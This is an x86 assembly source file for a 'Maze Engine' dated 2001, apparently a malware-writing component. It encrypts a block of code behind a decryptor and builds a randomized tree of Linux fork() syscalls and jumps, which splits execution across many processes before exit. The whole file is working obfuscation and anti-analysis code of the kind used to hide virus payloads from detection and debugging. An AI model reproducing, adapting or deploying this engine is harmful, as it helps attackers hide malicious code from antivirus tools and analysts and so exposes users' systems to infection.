
;
; [Maze Engine] - (c) 2001, Made in Taiwan.
;
; Usage:
;
;   [Input]
;	eax = offset where the decryption routine will be executed
;	ecx = point to the code which will be encrypted
;	edx = length of the code to encrypt
;	edi = buffer where the decryptor will be stored
;
;   [Output]
;	[maze_offset] = point to the (decryption routine + encrypted code)
;	[maze_size]   = length of the (decryption routine + encrypted code)
;	[maze_entry]  = entry point of the decryptor
;

%include "x87me.s"

maze_offset	dd 0
maze_size	dd 0
maze_entry	dd 0

maze_exi	dd 0
maze_tmp	dd 0

Maze:
	pusha
	
	push ebp
	mov ebx,edi
	xchg eax,ebp
	call X87ME
	pop ebp
	mov [ebp+maze_offset],ecx

	call make_exit_code
	lea esi,[ebp+addr_buffer]
	call make_maze_code
	
	sub edi,[ebp+maze_offset]
	mov [ebp+maze_size],edi

	call calc_maze_disp
	
	popa
	ret

calc_maze_disp:
	movzx ecx,byte [ebp+child_cnt]
	push ecx
	mov edx,ecx
	
	call rnd_get_routine1
	
	mov eax,edx
	xchg eax,[esi+04h]
	mov ebx,eax
	sub eax,[ebp+maze_exi]
	neg eax
	xchg eax,[ebx-04h]
	
	mov eax,edx
	xchg eax,[esi+08h]
	mov ebx,eax
	sub eax,[ebp+maze_offset]
	neg eax
	xchg eax,[ebx-04h]
	dec ecx
	
cmd_l1:	
	call rnd_get_routine1
	
	mov eax,edx
	xchg eax,[esi+04h]
	mov ebx,eax
	sub eax,[ebp+maze_exi]
	neg eax
	xchg eax,[ebx-04h]
	
	mov eax,edx
	xchg eax,[esi+08h]
	mov ebx,eax
	sub eax,[ebp+maze_exi]
	neg eax
	xchg eax,[ebx-04h]
	
	loop cmd_l1
	pop ecx
	
cmd_l2:	
	shr ecx,1
	push ecx
	mov edx,ecx
	
cmd_l3:	
	call rnd_get_routine1
	call rnd_get_routine2
	
	mov eax,edx
	xchg eax,[esi+04h]
	mov ebx,eax
	sub eax,[ebp+maze_tmp]
	neg eax
	xchg eax,[ebx-04h]
	
	call rnd_get_routine2
	
	mov eax,edx
	xchg eax,[esi+08h]
	mov ebx,eax
	sub eax,[ebp+maze_tmp]
	neg eax
	xchg eax,[ebx-04h]
	
	loop cmd_l3
	pop ecx
	cmp ecx,byte 1
	ja cmd_l2
	ret

rnd_get_routine1:
	push edx
rgr1_l:	
	rdtsc
	and eax,0ffh
	cmp al,[ebp+child_cnt+1]
	jae rgr1_l
	lea esi,[ebp+addr_buffer]
	imul eax,eax,byte 4*3
	add esi,eax
	mov eax,[esi]
	or eax,eax
	jz rgr1_l
	mov ebx,[esi+04h]
	test ebx,0ffffff00h
	jz rgr1_l
	sub eax,[ebp+maze_offset]
	mov [ebp+maze_entry],eax
	pop edx
	ret	
	
rnd_get_routine2:
	push esi
rgr2_l:	
	push edx
	rdtsc
	pop edx
	and eax,0ffh
	cmp al,[ebp+child_cnt+1]
	jae rgr2_l
	lea esi,[ebp+addr_buffer]
	imul eax,eax,byte 4*3
	add esi,eax
	mov eax,[esi]
	or eax,eax
	jz rgr2_l
	mov ebx,[esi+04h]
	test ebx,0ffffff00h
	jnz rgr2_l
	cmp ebx,edx
	jbe rgr2_l
	mov [ebp+maze_tmp],eax
	and dword [esi],byte 0
	pop esi
	ret	
			
child_cnt	db 0,0,0,0,0
child_tab	db 2,3, 2,3, 4,7, 8,15, 16,31, 32,63, 64,127, 128,255
	
make_maze_code:
	rdtsc
	and eax,byte 3			; = 1,3,7
	movzx ecx,word [ebp+eax*2+child_tab]
	mov [ebp+child_cnt],ecx
	shr ecx,8
mmc_l2:
	call mm_save_addr
		    ; mov eax,2 (fork)
		    ; int 80h	
	mov al,0b8h
	stosb
	mov eax,2
	stosd
	mov ax,80cdh
	stosw
		    ; or eax,eax
	mov ax,0c009h
	stosw	
		    ; je +05
	mov ax,0574h
	stosw
		    ; jmp
	mov al,0e9h
	stosb
	xor eax,eax
	stosd
	call mm_save_addr
		    ; jmp
	mov al,0e9h
	stosb
	xor eax,eax
	stosd
	call mm_save_addr
	loop mmc_l2
	ret
	
make_exit_code:	
	mov [ebp+maze_exi],edi
		    ; mov eax,29 (pause)
		    ; int 80h
	mov al,0b8h
	stosb
	mov eax,29
	stosd
	mov ax,80cdh
	stosw
		    ; mov eax,1 (exit)
		    ; int 80h
	mov al,0b8h
	stosb
	mov eax,1
	stosd
	mov ax,80cdh
	stosw
	ret

mm_save_addr:
	mov [esi],edi
	add esi,byte 4
	ret	
